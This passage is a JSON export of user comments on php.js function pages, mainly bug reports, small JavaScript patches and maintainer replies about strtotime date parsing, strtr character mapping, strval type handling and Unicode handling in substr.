"}],"strtolower":[{"date":"2008-09-26 13:25:53","author":"Onno Marsman","url":"","comment":"For when it's not a string e.g. strtoupper(6) :\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction strtolower( str ) {\r\n    return (str+'').toLowerCase();\r\n}\r\n[\/CODE]"},{"date":"2008-09-29 12:36:08","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Onno Marsman: Function has been updated according to your proposal!"},{"date":"2012-01-02 16:14:19","author":"mimo","url":"","comment":"eho dali shte e OK"}],"strtotime":[{"date":"2009-02-25 16:58:14","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Dave: I've contacted the original author Caio Ariede, and he's been kind enough to fix this function up. All testcases work now!"},{"date":"2009-03-16 20:44:39","author":"Jeppe","url":"http:\/\/jeppeb.nl","comment":"strtotime(\"last month\"), \"-1 month\", \"next month\", etc. doesn't work. Any ideas?\r\nThanks!"},{"date":"2009-03-22 19:39:13","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Jeppe: Well that's an issue that should actually have been fixed already. Are you sure you're running the latest version? Thanks!"},{"date":"2009-06-27 01:02:57","author":"Andrew","url":"","comment":"Getting an error --\n\n[code]Error: strTmp.replace is not a function[\/code]\n\nThe debugger is pointing to this line -- \n\n[code]strTmp = strTmp.replace(\/\\s{2,}|^\\s|\\s$\/g, ' '); \/\/ unecessary spaces[\/code]"},{"date":"2009-06-27 02:16:40","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"The function expects a string--you are mostly passing something to the function which is not a string."},{"date":"2009-08-12 11:05:40","author":"majak","url":"","comment":"I'm using the latest (2.85) minified and namespaced version of this function. This snippet:\n[CODE]\n$P.strtotime('+1 day');\n[\/CODE]\nproduces TypeError. I have tested it in both FF and Chrome, here are their error messages:\n\nFF:\nTypeError: match[i].split is not a function\n\nChrome:\nTypeError: Object function (inline) {\n    return (inline !== false ? this : this.toArray())._reverse();\n  } has no method 'split'\n\nI suppose it happens on every relative date string input, like \"-3 months\"."},{"date":"2009-08-12 14:49:55","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@majak, it appears you are using a library which overloads the Object prototype with its own functions which this PHP.JS function then iterates... You can solve this problem by adding right after line 184 (see above) the following line (and then the closing brace after line 187):\n\n[CODE]if (match.hasOwnProperty(i)) {[\/CODE]\n\nIf you need to work with older browsers like IE 5, you can add this instead:\n\n[CODE]if (typeof match[i] !== 'function') {[\/CODE]\n\nSee http:\/\/yuiblog.com\/blog\/2006\/09\/26\/for-in-intrigue\/ for a fuller explanation of why.\n\nAll of our for...in statements should really use such a test, though since it is cumbersome, and libraries should, imo, really not be altering the prototype in the first place, I think it is a toss-up as to whether we should add these checks ourselves. What do you think, Kevin?  Perhaps we should in order to be most compatible..."},{"date":"2009-08-17 14:12:36","author":"majak","url":"","comment":"@Brett Zamir: Thank you for your help. Your fix works.\nJust for reference, I'm using Prototype framework."},{"date":"2009-08-17 15:39:58","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@majak: Yeah, thanks, it seemed that way from the code snippet (figured out what was the problem by finding that code by Google). Be careful using Prototype or other libraries that overload the prototype objects--it causes problems like these..."},{"date":"2009-10-04 02:46:35","author":"Theriault","url":"","comment":"I noticed that none of the following work with this function:\r\n\r\ntoday (same as 'now' but resets to 12:00:00AM), tomorrow (same as '+1 day' but also resets to 12), yesterday (same as '-1 day' but also resets to 12).\r\n\r\nnext week, last week (Currently returns date plus\/minus seven days, should return next monday if I remember correctly on how it works in PHP). \r\n\r\nlast sunday of next month (returns next month, but not last sun\/sat\/mon\/day... of that month)\r\n\r\nYYYY-Wnn-d (Basically, sets year to YYYY, week number to nn, and then day of that week to d (0-6). Day of week may be omitted and also overflow, such as 7 for next week.)\r\n\r\n00:00:00 (Changes time to 12:00:00 AM or anything else entered here.)\r\n\r\n\r\nDoes anyone else see anything missing from this function? I may recode it. I would like to see it complete -- it is a great function."},{"date":"2009-10-06 00:18:18","author":"Theriault","url":"","comment":"PHP seems to apply the string as a whole and not from left-to-right as in this function. In the following PHP example, both $a and $b will be the same date. If PHP applied them from left-to-right, $b would be 2012-03-01, not 2012-02-29.\r\n[CODE]\r\n$d = strtotime('2011-02-22');\r\n$a = strtotime('+1 year, +7 days', $d); \/\/ 2012-02-29\r\n$b= strtotime('+7 days, +1 year', $d); \/\/ 2012-02-29\r\n[\/CODE]\r\nThis function applies the string from left-to-right, which seems more logical, but is incorrect."},{"date":"2009-10-08 22:10:13","author":"Daniel Janesch","url":"http:\/\/www.fotoeck.at","comment":"First of all: Great work :-)\nI have figured out that the following is not working correctly:\n[CODE]\n$d = new Date(2012, 11, 1, 7, 0, 0);\n$r = strtotime('3 Wednesday', $d.getTime()\/1000); \/\/ 2012-11-01 07:00:00\n[\/CODE]\nThe correct result with php is 2012-11-21 00:00:00 but with phpjs I get 1351753200 wich is 2012-11-01 07:00:00.\nAny clues?"},{"date":"2009-10-09 10:31:28","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Daniel Janesch & Theriault: Thanks for pointing out these problems. I've contacted the original author by mail."},{"date":"2009-12-01 10:34:34","author":"rav3n","url":"","comment":"this function is great. however i need to format the string not as %Y-%m-%d but as %d-%m-%Y.\n\ni understand that it's around line 150-170"},{"date":"2009-12-09 12:46:54","author":"iwosz","url":"","comment":"Under IE 7 strtotime('2009-12-09 12:45:16') returns NaN, can you explain that? some solutions? thx."},{"date":"2009-12-14 15:28:53","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ rav3n: You might be better off parsing your string first before feeding it to strtotime cause I believe PHP wouldn't support your format either.\n\n@ iwosz: Sorry no IE7 on my machine. So unless someone else can get to the bottom of this I may have to see if I can find some WinXP virtual image with IE7 installed or sth like that"},{"date":"2010-03-10 20:31:33","author":"Zahlii","url":"","comment":"Is it possible to add support for german-like Dates ?\n\nin PHP (5.3+), strototime('22.01.2010'); works as expected, but not with this js strtotime-method."},{"date":"2010-04-02 18:29:06","author":"Mike","url":"","comment":"hmm - couple of bugs in strtotime...\n1) strtotime('last Monday',now) returns last month not last monday - first 3 letters of month is the same as monday!\nwork around :\n[CODE]\nstrtotime('last Tuesday, -1 day',now);  \/\/ = last monday\n[\/CODE]\n\n2) strtotime('d-m-Y',now) isn't handled correctly (only 'Y-m-d' is) (as mentioned in other comments)\n3) in 2 above, the d and m have to be zero padded to work I.E. strtotime('2010-3-1') has to be replaced with ('2010-03-01')\nwork around :\n[CODE]\n\/\/examples from variable passed into function perhaps\nday = 2;\nmonth = 5;\nyear = 2010;\n\nif (day < 10) dayzeropad = '0'; else dayzeropad = '';\nif (month < 10) monthzeropad = '0'; else monthzeropad = '';\nvar tstring = year + '-' + monthzeropad + month + '-' + dayzeropad + day;\nunixtime = strtotime(tstring);\n[\/CODE]\n\nbugs work-aroundable... cool stuff - thanks."},{"date":"2010-08-16 14:34:11","author":"Jack","url":"","comment":"Example 4 returns NaN. Seems to be broken!"},{"date":"2010-08-16 15:04:07","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Jack: The syntax highlighting code here is buggy, so when you copy-paste it directly, some lines will be commented out. Go to \"raw js source\" to make sure you have a good copy...It is working with the right code..."},{"date":"2010-08-17 14:48:50","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"test"},{"date":"2010-08-28 16:25:16","author":"Brad","url":"","comment":"When I run\n[CODE]\ndate(\"F j, Y\", strtotime(\"2010-08-03\"));\n[\/CODE]\nI get \"August 2, 2010\""},{"date":"2010-08-29 05:58:29","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Brad: I think it is most likely a timezone issue. Our date function currently does not support the setting of a default timezone (as PHP also allows and recommends), so there may be some problem in setting date values according to the browser locale and then using such values across our functions.\n\nYou can see \"raw js source\", note #2, on the date function for the latest notes about how this could be implemented if you are able to make the changes to our code yourself (sorry, I have no time at the moment). Anyone else feel free to help out if you can."},{"date":"2010-11-10 13:44:41","author":"Tommy","url":"empatix.no","comment":"hello,\nthis function doesnt support format like this: \n\n2010-11-10T13:34:00+01:00"},{"date":"2010-12-09 01:43:34","author":"Scott Connerly","url":"http:\/\/scott.connerly.net","comment":"When parsing ISO 8601 dates, PHP's strtotime() doesn't care if there's a colon in the GMT-06:00. php.js's version requires the colon to be there. This most notably comes into play with Facebook's open social graph dates, it won't parse them unless you insert the colon."},{"date":"2011-06-24 22:28:45","author":"Zubin Khavarian","url":"http:\/\/zubink.com","comment":"There seems to be a bug where different date formats return different values, try:\n\nstrtotime('2011-06-24'); \/\/1308873600\nstrtotime('06\/24\/2011'); \/\/1308891600\n\ndate('D M j, Y', strtotime('2011-06-24')); \/\/Thu Jun 23, 2011\ndate('D M j, Y', strtotime('06\/24\/2011')); \/\/Fri Jun 24, 2011"},{"date":"2011-07-28 17:37:51","author":"Jason","url":"http:\/\/jasonbutz.info","comment":"Try this in Firefox 5:\n[code]\nconsole.log(strtotime(\"06\/28\/2011\"));\nconsole.log(strtotime(\"06\/28\/11\"));\n[\/code]\n\nYou get \n[code]\n1309237200\n-1846522800\n[\/code]\n\nIt isn't properly detecting 2 digit years."},{"date":"2011-07-28 20:32:01","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"Yeah. Date.parse() is now apparently treating \"11\" as 1911. And since Date.parse() might vary across browsers, we should I think be using our own implementation anyways rather than allowing for different behavior by browser. Thoughts?"},{"date":"2011-08-08 14:50:27","author":"Romaric","url":"","comment":"Hi everybody\n\nNice function, I've used it a lot, but encountered a few issues :\n - it seems unable to decode YYYYMMDD format (not really bad, just use a regex)\n - in French, there are accented chars in month names. But when using short names, it will truncate the html char, i.e. AO& instead of AO&Ucirc;. I came up with this fix, using html_entity_decode (you may want to apply it to week days, too) :\n[CODE]\n        M: function () { \/\/ Shorthand month name; Jan...Dec\n        \t\/\/ Romaric : using html_entity_decode to avoid bugs with accented chars\n        \tvar _month = f.F();\n        \t_month = html_entity_decode(_month);\n            return _month.slice(0, 3);\n        },\n[\/CODE]"},{"date":"2011-10-04 07:10:20","author":"Brad Ramsey","url":"","comment":"I don't understand why 2011-10-03 is not the same as 10\/03\/2011... so I patched the function after line 25:\n\n[CODE]\nmatch = strTmp.match(\/^(\\d{4})-(\\d{2})-(\\d{2})$\/);\nif (match != null) {\n    strTmp = match[2] + '\/' + match[3] + '\/' + match[1];\n}\n[CODE]\n\nWorked for me."},{"date":"2011-10-11 00:20:00","author":"Daniele","url":"http:\/\/www.plancake.com","comment":"This function would be so useful if it was reliable\n\nAn example:\n\nPHP\ndate(\"Y-m-d\", strtotime('second Monday October 2011'));\nreturns: 2011-10-10\n(which is right)\n\nJS:\ndate(\"Y-m-d\", strtotime('second Monday October 2011'));\nreturns: 1970-01-01\n(which is obviously wrong)\n\nAny solution, suggestion, work around?\n\nIs this function still maintained? If not, maybe I can start working with somebody to maintain it back."},{"date":"2011-10-11 10:47:48","author":"Daniele","url":"www.plancake.com","comment":"I am using this function on something mission-critical for the user (an online task manager and calendar) so I need it to be flawless.\n\nI am trying to find bugs and fix them myself. If you want to help me, please contact me.\n\nI would also like to contribute to the Github repo with my fixes - how can I do that?\n\nHere is another bug:\n\ndate(\"Y-m-d\", strtotime('+3 days'));  \/\/  returns 2011-10-14\ndate(\"Y-m-d\", strtotime('+3 days', 1324815132));  \/\/ returns 2011-10-14\n\nI have fixed the bug by replacing line 30 of the version version: 1109.2015 with:\n} else if ((!now) && !isNaN(parse = Date.parse(strTmp))) {\n\nI hope that won't introduce new bugs.\n\nAny ideas?"},{"date":"2011-12-28 06:38:32","author":"Tom","url":"","comment":"echo(date(\"Y-m-d H:i:s\", strtotime(\"last monday\", 1325050486)));\n\ngives: 2011-11-28 06:34:46 \nexpected: 2011-12-26 00:00:00"},{"date":"2012-03-04 03:30:41","author":"Denny Wardhana","url":"wardhana.com","comment":"I've just noticed that this function and also other functions which are using Date.parse return incorrect result in:\n- Chrome 4 and older (can be ignored)\n- IE8 and older (hardly to be ignored)\n- Safari latest version and older (shouldn't be ignored)"},{"date":"2012-06-15 10:25:32","author":"wookie","url":"","comment":"I was getting an error when I was sending '2004-02-12T23:00:00.000Z' to get converted, it complained that it wasn't a string.. weird. Anyway my fix was:\n[CODE]\nstrTmp = str+'';\n[\/CODE]"},{"date":"2012-07-03 19:15:07","author":"Matteo","url":"","comment":"There is a problem:\n\nusing this function:\n\nstrtotime('2012-07-01 +7 DAY') = 1341931365.248\n\nwhile PHP says:\n\nstrtotime('2012-07-01 +7 DAY') = 1341698400\n\nis it an error on my part or in the function?"},{"date":"2012-07-04 02:28:54","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Matteo: I haven't looked at it carefully, but are you controlling for timezone (browser vs. server)?"},{"date":"2012-07-04 14:47:12","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@wookie: I made a change; are u using Adobe Air, I think it was which passes around String objects for some reason? \n\n@Daniele: You can make a \"pull request\" at Github for us to accept your changes.\n\nEveryone else commenting here: Sorry, moving slowly here."},{"date":"2012-07-04 14:52:48","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Tom: Are you using the latest versions of the code? Please visit \"raw js source\". I am getting the result you said you were expecting."},{"date":"2012-07-04 16:58:34","author":"Matteo","url":"","comment":"@Brett: I do not think that the timezone can justify a difference of many days!\n\nusing php.js: date('Y-m-d', strtotime('2012-07-01 +7 DAY')) = 2012-07-11 --> wrong\n\nusing php: date('Y-m-d', strtotime('2012-07-01 +7 DAY')) = '2012-07-08' --> correct"},{"date":"2012-07-05 03:42:23","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Matteo: Yeah, I see. Based on other comments here as well, this function needs a good amount of work, and I'm a bit busy to undertake it now. Anyone? Looking at PHP source or http:\/\/www.gnu.org\/software\/tar\/manual\/html_node\/Date-input-formats.html would be ideal to ensure all areas are addressed."},{"date":"2012-07-09 17:49:26","author":"Matteo","url":"","comment":"I do not know if this can help, but I noticed this:\n\ndate('Y-m-d', strtotime('2012-07-01 +7 DAY')) = 2012-07-11 --> wrong\n\nbut\n\ndate('Y-m-d', strtotime('+7 DAY', strtotime('2012-07-01'))) = 2012-07-08 --> correct"}],"strtoupper":[{"date":"2008-09-26 13:24:36","author":"Onno Marsman","url":"","comment":"For when it's not a string e.g. strtoupper(6) :\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nfunction strtoupper( str ) {\r\n    return (str+'').toUpperCase();\r\n}\r\n[\/CODE]"},{"date":"2008-09-29 12:35:51","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Onno Marsman: Function has been updated according to your proposal!"}],"strtr":[{"date":"2009-03-10 13:35:01","author":"uestla","url":"","comment":"In PHP the function strtr() called with three arguments (string, from, to) replaces the characters in the whole string. Shouldn't be the global modificator 'g' in your script?\n\nThanks for your answer, uestla (sorry for my english)."},{"date":"2009-05-29 09:36:38","author":"Jason Wang","url":"www.carrot.org","comment":"There is a bug for the function. For example, when using PHP strtr(\"abc\",\"abc\",\"cba\") the result is \"cba\". But using this function, the result is \"aba\". Because the first character \"a\" is replaced by \"c\", however it became \"a\" when trying to replace all character \"c\" with \"a\". Maybe here we can use some array to store the status as well the chars in order to solve the problem. \nGood Luck"},{"date":"2009-05-30 05:37:10","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Kevin fixed it in SVN...Thanks for the reports!"},{"date":"2009-06-30 08:32:41","author":"Roland Hentschel","url":"","comment":"An implementation for this script:\n\nhttp:\/\/kevin.vanzonneveld.net\/techblog\/article\/javascript_equivalent_for_phps_chr\/\n\n[CODE]\nfunction charmap(font) {\n\tdocument.write(\"<style>\\n*{font-family:\"\n\t+font+\"; font-size:24pt;}\\n<\/style>\\n\");\n\tdocument.write(\"<table>\\n\");\n\tfor (x=0;x<16;x++) {\n\t\tdocument.write(\"<tr>\\n\");\n\t\tfor (y=0;y<16;y++) {\n\t\t\tdocument.write(\"<td>\"+chr(16*x+y)+\"<\/td>\\n\");\n\t\t}\n\t\tdocument.write(\"<\/tr>\\n\");\n\t}\n\tdocument.write(\"<\/table>\\n\");\n}\n[\/CODE]"},{"date":"2009-07-02 15:25:46","author":"Frank Forte","url":"http:\/\/thenetgen.com\/","comment":"I found the following error with the htmlspecialchars() function when doing the following:\n\n[code]\nel.innerHTML = htmlspecialchars('test 1 < 2 ');\n[\/code]\n\nThe output (inserted into the element) was\n'test 1 &lt; 2'\n\nThe htmlspecialchars function does this:\nstep 1  < turns to &lt;\nstep 2 &lt; turns to &amp;lt;\n\nThis is because the & symbol would be converted AFTER the < character was converted (or any other character for that matter)\n\nI fixed the problem by moving the line:\n[code]\nentities['38'] = '&amp;';\n[\/code]\nnear the top of the html_translation_table() function,\nright above the the following line:\n\n[code]\n if (useTable === 'HTML_ENTITIES') {\n[\/code]\n\nThis would make sure that the & characters is converted first, then the rest of the charachters would be converted.\n\n-Frank Forte"},{"date":"2009-07-02 22:59:55","author":"T.Wild","url":"","comment":"@Frank Forte\nYou may want to post your problem over at\nhttp:\/\/phpjs.org\/functions\/htmlspecialchars\nrather than here on strtr"},{"date":"2009-07-03 13:52:01","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Roland Hentschel: Thanks for sharing\n\n@ Frank Forte & T.Wild: Cool, let's continue at the page suggested by T.Wild"},{"date":"2009-10-31 12:25:41","author":"kwemart","url":"","comment":"hi this function is very nice but I propose an other solution , it only work with a regular expression.\n\n[code]\nfunction strtr(str,from,to)\n                  {\n                  var patt=str.split(from),str2=\"\";\n                  var l=patt.length,i=1;\n                  while(i<=l-1){str=str.replace(from,to);i+=1;}\n                  return str;\n                  }\n[\/code]\n\n"},{"date":"2009-11-07 18:50:03","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ kwemart: Thanks for sharing. However with your code, only the 3rd example produces the expected output. The other ones fail :("},{"date":"2009-11-20 12:10:58","author":"kwemart","url":"","comment":"@kevin van\n\nyes I know my function is just for regulars expressions\nit wouldn't work with ayyay but I'll update it later \n\ncheer ."},{"date":"2009-12-09 22:30:16","author":"jpfle","url":"","comment":"Hi. Thanks for this useful function. I use it in a script generating a table of contents for XHTML pages. Each title in a page is transliterated ('\u00e0' => 'a', '\u00e9' => 'e', '\u00ee' => 'i', etc.) with strstr() to create an anchor. However, there's a bug with Internet Explorer 6. Take this code:\n\n[CODE]\nvar texte = '\u00e7\u00e0 et l\u00e0';\ntexte = strtr(texte, {'\u00e7': 'c', '\u00e0': 'a', ' ': '-'});\nalert(texte);\n[\/CODE]\n\nFirefox (3.5.5) outputs \"ca-et-la\", as expected, but IE6 outputs \"ca-undefinedundefined-undefineda\"."},{"date":"2009-12-10 05:42:56","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@jpfle: Should now be fixed: http:\/\/github.com\/kvz\/phpjs\/blob\/master\/functions\/strings\/strtr.js . Please note that I've needed to add a new dependency: ini_set(). Also, this will not work with IE5 as is, since I also added for-in filtering for hasOwnProperty (you can remove the check (or alter it to at least make sure from[fr] is a string) if you need to support IE5, but you risk interfering with other libraries that override the Object prototype; otherwise it's best to leave it as is)."},{"date":"2009-12-11 04:25:40","author":"jpfle","url":"","comment":"@Brett: Thanks for your answer. However, it no longer works neither on Firefox nor IE. Here's what I packaged on phpjs.org:\n\n- `i18n_loc_get_default()`\n- `i18n_loc_set_default()`\n- `ini_set()`\n- `krsort()`\n- `strtr()`\n\nand then I replaced `strtr()` by github's version. With the same code of my previous comment, \"\u00e7a et l\u00e0\" is output on Firefox and IE without any translation, namely \"\u00e7a et l\u00e0\". Firefox's Error Console is empty."},{"date":"2009-12-11 12:40:42","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@jpfle: Sorry, I had also needed to update krsort() recently too. Please use the version at http:\/\/github.com\/kvz\/phpjs\/blob\/master\/functions\/array\/krsort.js"},{"date":"2009-12-11 16:20:54","author":"jpfle","url":"","comment":"@Brett: it works very great now. Thanks again! :-)"},{"date":"2010-12-01 20:41:28","author":"Robert","url":"","comment":"What about something more like this? I saw an example of using this for urlencode and thought it would work well for strtr.\n\n[CODE]\nfunction strtr(base, old, n){\n  return base.replace(\/[A-Za-z0-9_.-]\/g, function (s) {\n    for (var k = 0; k < old.length; k++) {\n      if (s == old.charAt(k) && k < n.length) {\n        return n.charAt(k);\n      }\n    }\n  });\n}\n[\/CODE]"},{"date":"2010-12-02 09:55:47","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Robert: Please try your function against the existing examples to make sure it works. Thanks..."},{"date":"2011-03-27 23:45:26","author":"odin","url":"http:\/\/preseka.mygamesonline.com","comment":"Hey i maid even bether one look down:\nit contanis 0 loops for norma use and 1 loop for advanced use\n[CODE]\nfunction strtr(s,f,t)\n{\ncore=function(str,from,to){\/\/core function\nstr=str.split(from);\/\/breake parts that we wan't to\nstr=str.join(to);\/\/glue with new parts that we wan't to\nreturn str;\n};\/\/end of core function\nif(!t){\/\/check if we use advanced option\nr=s;\nfor(e in f){\/\/loop\nr=core(r,e,f[e]);\/\/call our core function\n}\nreturn r;\/\/ end code and retun value\n}\n\/\/normal use\nreturn core(s,f,t); \/\/ just call normal core function and return\n}\n\/*\nexample:\nnormal use:\n   strtr(\"This string is string.\",\"string\",\"text\");\n=This text is text.\n\nadvanced use\n  strtr(\"This string is texty.\",{'texty':'text','string':'text'});\n=This text is string.\n\nadvanced use WARNING!\n  strtr(\"This string is text.\",{'text':'string','string':'text'});\n=This text is text.\nthis is not switcher it's replacer!!\n*\/\n[\/CODE]"},{"date":"2011-05-10 11:24:02","author":"Breton","url":"","comment":"Hi, there is a new bug in IE9 with the function strtr !\nThis line doesn't work : \"if (str.substr(i, from[j].length) == from[j]) {\"\nHave you got any idea ?\n\nYou can see the error here : http:\/\/imageshack.us\/photo\/my-images\/805\/bugc.jpg\/\n\nFucking IE ! ^^'"},{"date":"2011-05-13 10:28:09","author":"Theriault","url":"","comment":"@Breton: I can't verify it because I don't have IE9, but my guess on a fix would be changing line 55 from...\r\n[CODE]\r\ntmpFrom.push(fr);\r\n[\/CODE]\r\nto...\r\n[CODE]\r\ntmpFrom.push('' + fr);\r\n[\/CODE]\r\nLet us know if this fixes it."},{"date":"2012-04-10 09:52:43","author":"????? ????????","url":"http:\/\/an3m1.com\/","comment":"Great job here. I really enjoyed what you had to say. Keep going because you definitely bring a new voice to this subject. Not many people would say what you\u2019ve said and still make it interesting \n"}],"strval":[{"date":"2009-01-13 02:47:51","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Hi Kevin,\r\n\r\nA couple things... First, &quot;type&quot; should not be added to the final return result. strval() just gives the value unless it is an array, object.\r\n\r\nAlso, by using is_array() which returns true for objects, putting in an object gives &quot;Array&quot;. Maybe to resolve that issue, you could require that people who wish to use objects as arrays add a length property? I think that might be a good compromise (of course the functions would need to be programmed to ignore the length property)."},{"date":"2009-01-13 13:12:18","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: strval: yeah stupid, it was late last night ;)\r\n\r\nThis is actually the exact same discussion as with is_array. 'Polluting' user variables is never an option in my eyes.\r\n\r\nBut class-like objects will be presented as 'function' right?"},{"date":"2009-01-13 15:22:47","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Np at all...\r\n\r\nI guess you mean &quot;class-like functions will be presented as 'function'&quot;? Since PHP doesn't even allow classes or functions as data like in JavaScript (except callbacks represented as strings), I guess it wouldn't hurt to return &quot;function&quot; as it does now. But as it is now, there's no way to get &quot;object&quot; back, as in PHP, since you're treating them as arrays.\r\n\r\nAs far as polluting user variables, rather than adding the 'length' property to an object that doesn't have it, I'm now just suggesting that if objects are passed in without 'length', then they should be considered regular objects and not arrays. This will make type detection more clear, and it is a good practice to encourage adding 'length' if it is to be an &quot;array-like object&quot;. Some extensions like array_push() could even increment this property for the user, if it were present (though that need not be enforced, as array-like objects often let the user handle the length handling, though I think it would be convenient for PHP-JS to handle). I think the danger of someone including a &quot;length&quot; property on an object and our treating it as having some other meaning (though we wouldn't need to change it, if you don't want) would be much less prevalent than someone expecting, for example, is_array() to return false for a regular object. JavaScript doesn't even guarantee that objects will be iterated in order (though they always seem to be), so I think it is more standard to only treat them as arrays if the user is doing something to make them seem that way. But it's of course your call.\r\n\r\nThanks for your hard work in keeping up with us! Your thoughtful quality control really adds clout to the project..."},{"date":"2009-01-13 18:14:17","author":"Onno Marsman","url":"","comment":"the function gettype will never return 'object' the way it is currently implemented."},{"date":"2009-01-13 18:18:20","author":"Onno Marsman","url":"","comment":"Sorry, Brett, didn't read your comments, you already mentioned this, though I wouldn't solve it the way you suggest because of the argument against this you provided yourself. \r\n\r\nDidn't contribute much here, did I... sorry ;)"},{"date":"2009-01-14 10:52:43","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Onno Marsman: Again, because this was such a controversial decision, I cannot be assured that we never change it's implementation. I think other functions should be aware of this uncertainty and allow for different approaches we may or may not take in the future.\r\n\r\nTake Brett's point for example: for me this may be the most acceptable way of distinguishing objects from arrays I've seen so far. But inded: only if the length property is already present, I will never want php.js to pollute user data.\r\n\r\nAnd so that basically means the length element will always have to be added by the users themselves. Which is very un-php-like and would require documentation throughout the project to keep pointing that out to everyone using associative array functions.\r\n\r\nFrom a PHP point of view: What would be the need to even look at objects differently than associative arrays. Maybe it's just me but I cannot imagine many situations that would require this distinction. If you look at it from a JavaScript perspective: yes, but then, you should also just use javascript statements if you want that."},{"date":"2009-01-15 21:00:08","author":"Onno Marsman","url":"","comment":"About your last paragraph: I don't see the need to make a distinction between an object and an associative array either. That's why I've always said I think they should both be considered objects (which they really are) and only be treated as an associative array in functions that expect an array and not an object (is_array clearly doesn't expect an array, you can pass an object to is_array in PHP which will return false) \r\n\r\nBut I really don't care much about these types of functions because I'll never use them. So as far as I'm concerned: feel free to do anything. I just can't help replying to stuff like this when I see things getting more complex than I think they need to be."}],"substr":[{"date":"2008-09-03 00:46:31","author":"T.Wild","url":"","comment":"Had a bit of difficulty when this function was passed an integer instead of a string since [CODE=&quot;javascript&quot;].substring[\/CODE] isn't an integer function.\r\n\r\nI fixed the error thusly:\r\n[CODE=&quot;javascript&quot;]\r\nreturn (&quot;&quot;+f_string).substring(f_start, f_length);\r\n[\/CODE]\r\ninstead of:\r\n[CODE=&quot;javascript&quot;]\r\nreturn f_string.substring(f_start, f_length);\r\n[\/CODE]\r\nforcing f_string to be a string, since this is how the PHP version treats the first parameter.\r\n[CODE=&quot;php&quot;]\r\nsubstr(1234,2,1) = 3;\r\n[\/CODE]\r\n\r\nhope this helps."},{"date":"2008-09-05 21:25:01","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ T.Wild: Sure does, thank you for your bugfix. I've also added a testcase for this situation so it cannot happen again."},{"date":"2010-04-05 14:49:10","author":"Val Che","url":"http:\/\/chupakabr.ru","comment":"This one workd fine for me too :-) Thanks guys"},{"date":"2010-05-27 18:15:31","author":"dazz","url":"","comment":"wtF?? This Function is veryyy looooong"},{"date":"2010-05-28 03:06:31","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@dazz: Most of the code length (which is code which is only run if you type [CODE]ini_set('unicode.semantics',  'on');\n[\/CODE] before running substr) is for those who need to support Unicode 100%. \n\nUnicode was invented to allow one to display any written character from any language on the same page at the same time, and JavaScript supports this. In the past, one could only use one or a few language scripts on the same page (e.g., ASCII for English, Latin-1 for European languages, etc.).\n\nEach character in Unicode is represented abstractly by a number, so even if you can't see it (or if the current font doesn't support it), we can talk about a given character.\n\nHowever, given all of the other written scripts being used in Unicode (i.e., all living scripts and even for many dead written languages), there were so many that once the more common characters of human languages were assigned to slots representable by a single character in JavaScript (2 bytes), there weren't any more slots left, so for some rarely used characters (like some ancient Chinese characters) it became necessary to represent them by 2 reserved characters (4 bytes) combined together (individually called \"surrogates\", the first in the pair being a \"high surrogate\" and the second a \"low surrogate\") which are not display characters by themselves but as far as memory and JavaScript functions are normally concerned (e.g., string length), they are like 2 full characters.\n\nFor example, try this in JavaScript (I recommend \"Extension Developer's Extension\" for Firefox, so you don't need to save a file but can just test JavaScript immediately from the toolbar; I like its XUL Editor for this as it evaluates the JavaScript immediately):\n\n[CODE]alert('\ud87e\udcea'.length);[\/CODE]\n\nAlthough the above is only one character as far as appearance and cutting-and-pasting, the code will actually alert \"2\"!\n\nAnd if you use [CODE]alert('\ud87e\udcea'.charAt(0));[\/CODE] to find out what the first \"character\" inside that character is (or [CODE]alert('\ud87e\udcea'.charAt(1));[\/CODE] to find out what the second one is), you'll see a weird number in a box be displayed (at least in Firefox) which means it is a character not supported by one's font, and in this case that is because the \"character\" is not even a character so your font is not going to display this like a character anyways.\n\nSo, substr (as it will be in international-friendly PHP6), when in Unicode mode (set by ini_set()) should not mistreat these in a count as though they were 2 characters (it should treat the surrogate pairs as though a single whole character), nor should it potentially cut these characters in half leading to a non-readable character being left over.  Hope that helps explain it a little... \n\nNot all of our functions are Unicode friendly in this way (and probably few if any other JavaScript libraries even take this into account in any of their functions) but we should support this for users who wish to use it (especially given that PHP6 is potentially supporting such characters).\n\n@others: Sorry, I hope to get to your comments\/patches soon... Been busy with work deadlines..."},{"date":"2010-05-28 03:17:27","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@dazz: By the way, in addition to my comments just now, be aware that if you try to use some of these 4-byte characters on the web, they could actually cause problems for sites. For example, MySQL will not even store these unless the field is defined as binary. Some sites like 